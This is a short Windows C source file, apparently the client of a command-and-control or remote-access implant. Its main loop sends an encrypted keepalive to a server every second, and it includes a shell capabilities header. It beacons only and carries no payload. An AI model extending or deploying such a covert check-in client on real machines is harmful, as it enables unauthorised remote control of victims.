#include "crypt.h"
#include "comm.h"
#include "capabilities/shell.h"
#include "protocol.h"
#include <windows.h>
#include <stdio.h>

/**
 * This function will run the keepalive loop that looks for new commands and notifies the server that the client is alive.
 */
int main(){
    while(1){
        CommandType keepalive = CMD_KEEPALIVE;
        char* command = commands[keepalive];
        char* encrypted_command = encrypt(command);
        
        char buffer[512];
        int failure = send_and_receive(encrypted_command, buffer, 512);

        if (!failure){
            printf("SUCCESS!");
        }
        


        Sleep(1000);
    }


}